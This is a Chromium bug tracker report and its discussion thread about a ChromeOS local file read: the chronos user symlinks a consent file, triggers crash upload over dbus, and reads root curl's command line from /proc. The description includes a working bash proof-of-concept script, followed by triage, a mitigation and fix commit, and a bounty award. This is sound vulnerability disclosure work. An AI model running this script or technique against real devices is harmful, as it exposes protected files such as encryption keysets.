# Security: chronos user local file read

| Field | Value |
|-------|-------|
| **Issue ID** | [40086408](https://issues.chromium.org/issues/40086408) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | OS>Systems |
| **Platforms** | ChromeOS |
| **Reporter** | ro...@rorym.cnamara.com |
| **Assignee** | va...@chromium.org |
| **Created** | 2017-01-04 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

It was found that the 'chronos' user can read any file on the local filesystem via the UploadCrashes dbus endpoint and observing the /proc filesystem.  

This issue was verified under both developer mode, and utilising the exploit in [crbug.com/677817](https://crbug.com/677817) on a non-developer device.

**VERSION**  

ChromeOS Version:  

Toshiba Chromebook 2  

Version 55.0.2883.103 (64-bit)  

Platform 8872.73.0 (Official Build) stable-channel swanky  

Firmware Google\_Swanky.5216.238.5

**REPRODUCTION CASE**  

When sending crash reports via the crash\_sender bash script, the guid, stored in "/home/chronos/Consent To Send Stats" is read and sent as part of the curl  

command [1]. This file did not exist on my Chromebook, and the chronos user has write access to /home/chronos, so it was possible to create the appropriate  

file as a symlink pointing to an arbitrary file. If an appropriate .meta file is created in the /home/chronos/crash directory, and the crash\_sender script  

is invoked (via the org.chromium.debugd.UploadCrashes dbus endpoint), the file is read by the root user and sent as part of the curl command. The chronos  

user can wait for the curl command to be executed, and read the value of /proc/$(pidof curl)/cmdline to read the contents of the targeted file.

[1] <https://chromium.googlesource.com/chromiumos/platform/crash-reporter/+/master/crash_sender#424>

The below sample script can be executed by the chronos user, with an arbitrary filename argument to read the output. Note that this script is sometimes  

unreliable so it is given as a proof of concept. The general flow is: symlink "Consent To Send Stats" to a desired file, create a minimal .meta crash file,  

UploadCrashes is invoked and then we wait for curl to execute.

As a proof of concept, using this method it was possible to read all user ecryptfs master.0 keysets.

TARGET=$1  

[[ -z $1 ]] && exit 1  

rm -f /tmp/cmdline "/home/chronos/Consent To Send Stats"  

mkdir /home/chronos/crash 2>/dev/null  

ln -sf "${TARGET}" "/home/chronos/Consent To Send Stats"  

echo "payload=/home/chronos/crash/exploit.dmp" > /home/chronos/crash/exploit.meta  

echo "done=1" >> /home/chronos/crash/exploit.meta  

date > /home/chronos/crash/exploit.dmp  

dbus-send --reply-timeout=2000 --print-reply --system --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.UploadCrashes  

grep "Scheduled to send in" /var/log/messages | tail -n1  

until pidof curl >/dev/null; do continue; done  

cp /proc/$(pidof curl)/cmdline /tmp/cmdline  

cat /tmp/cmdline | sed "1 s/.\*guid=//;$ s/-o./tmp/crash\_sender.\*//" && echo

## Timeline

### mm...@chromium.org (2017-01-05)

Thanks for your report. Passing this over to Chrome OS Security folks.

[Monorail components: OS>Systems]

### va...@chromium.org (2017-01-06)

i'm not sure about this one.  once crbug.com/677817 is closed (fix is already cherry picked into M57), this is no longer an issue.  this fundamentally relies on having a shell and running arbitrary commands which is not allowed in verified mode.

while we can harden crash_sender (and arguably, we should be rewriting that in C++ anyways), this attack route can be triggered multiple ways.  debugd also cats this file w/out doing a symlink check.  neither of which can defend against a symlink because of TOCTOU vectors.  we could add sanity checks like only extracting the first ~20 bytes (however many we store for the guid), but that wouldn't really fix this bug because it'd still be "local file read of first ~20 bytes".

also, this specific attack against crash_sender doesn't allow you to fully read a file.  bash will silently delete NUL bytes, and the code in question deletes all dashes via `tr`.

### ro...@rorym.cnamara.com (2017-01-06)

The use of crbug.com/677817 was only to prove that it was not due to the disk permissions change caused by the switch to developer mode, and because I had it available to me.

With that said, I agree with your points and this issue would have to be part of a longer attack chain.

Would it not be possible to move the "Consent To Send Stats" to a location where the chronos user does not have write access to create a symlink? Verified IO could be done to the file via dbus/debugd which should mitigate any TOCTOU vectors.

I noticed debugd catting the file, but have not reported it because I cannot see any security impact, there were no files on my device owned by, or in the group of debugd (/proc/self/status shows the specific cat command is run as this user).

### va...@chromium.org (2017-01-06)

currently the consent file is managed by chromium (the browser), so changing it to read/write the file indirectly (say via dbus) would take a good amount of work.  so it's possible, but a bit of a yak shave.

wrt debugd, iirc, you can go to chrome://net-internals and get debug logs, and that'll make the dbus calls to debugd to run the logging functions.  then you can unpack that tarball and get the full file directly.

### ro...@rorym.cnamara.com (2017-01-06)

I just gave the debug logs functionality in chrome://net-internals a go, whilst the dbus endpoint (org.chromium.debugd.GetLogs I think) does read the file, it does not end up in the final .tgz.

In that case, perhaps more restrictive filtering may be appropriate, rather than just tr. For example, a sed for only guids:

cut -c -36 | sed -rn "/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/p"

This would not 'fix' the issue, but would mitigate it to the point that it is not usefully exploitable, unless there are other critical GUIDS stored alone in files on the system.

### va...@chromium.org (2017-01-06)

specifically for this one file, i posted this CL:
  http://chromium-review.googlesource.com/422851

### ro...@rorym.cnamara.com (2017-01-06)

It looks like that will effectively mitigate this issue.

### sh...@chromium.org (2017-01-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-01-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/platform2/+/c3e835a0b87ea608be5c4edf02be8ae115496277

commit c3e835a0b87ea608be5c4edf02be8ae115496277
Author: Mike Frysinger <vapier@chromium.org>
Date: Fri Jan 06 09:09:34 2017

metrics: centralize client id look up

We provide limited sanity checking on the client id file, and we do so
in different places (differently).  Centralize the logic in the metrics
client so we don't duplicate the logic and we only have to robustify a
single code path.

I'm not a fan of exposing this ID more, but forcing people to duplicate
the logic is clearly worse in practice.

BUG=chromium:678365
TEST=precq passes

Change-Id: Ib8c16fa0b3dc7d5e42cfb3f81df29d99336613d6
Reviewed-on: https://chromium-review.googlesource.com/422851
Commit-Ready: Mike Frysinger <vapier@chromium.org>
Tested-by: Mike Frysinger <vapier@chromium.org>
Reviewed-by: Luigi Semenzato <semenzato@chromium.org>

[modify] https://crrev.com/c3e835a0b87ea608be5c4edf02be8ae115496277/metrics/metrics_library.cc
[modify] https://crrev.com/c3e835a0b87ea608be5c4edf02be8ae115496277/debugd/src/log_tool.cc
[modify] https://crrev.com/c3e835a0b87ea608be5c4edf02be8ae115496277/metrics/metrics_client.cc
[modify] https://crrev.com/c3e835a0b87ea608be5c4edf02be8ae115496277/metrics/metrics_library_test.cc
[modify] https://crrev.com/c3e835a0b87ea608be5c4edf02be8ae115496277/metrics/metrics_library.h
[modify] https://crrev.com/c3e835a0b87ea608be5c4edf02be8ae115496277/crash-reporter/crash_sender


### sh...@chromium.org (2017-01-20)

vapier: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### va...@chromium.org (2017-01-20)

i think we'll consider this issue resolved for M57+.  the impact is low as i don't believe there's any content on the device that strictly needs to be kept secret while a user is logged in.  we don't allow multiple users to be logged in simultaneously, so you can't escalate to reading other people's data.  we don't store secret keys that can be abused (as far as i'm aware).

unless mnissler@ thinks there's anything else to do here, i'll close it out.

### sh...@chromium.org (2017-01-21)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-23)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-24)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-27)

Thanks for the report!  The panel decided to award $500 for this bug, noting the limited impact per https://crbug.com/chromium/678365#c12.  A member of our finance team will be in touch shortly.

### ro...@rorym.cnamara.com (2017-01-27)

Thanks!

### aw...@chromium.org (2017-01-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-02-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-02-04)

Your change meets the bar and is auto-approved for M57. Please go ahead and merge the CL to branch 2987 manually. Please contact milestone owner if you have questions.
Owners: amineer@(clank), cmasso@(bling), ketakid@(cros), govind@(desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### va...@chromium.org (2017-02-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-04-29)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dc...@google.com (2017-05-30)

[Empty comment from Monorail migration]

### dc...@chromium.org (2017-08-01)

[Empty comment from Monorail migration]

### dc...@chromium.org (2018-01-22)

[Empty comment from Monorail migration]

### va...@chromium.org (2018-06-21)

[Empty comment from Monorail migration]

### is...@google.com (2018-06-21)

This issue was migrated from crbug.com/chromium/678365?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086408)*
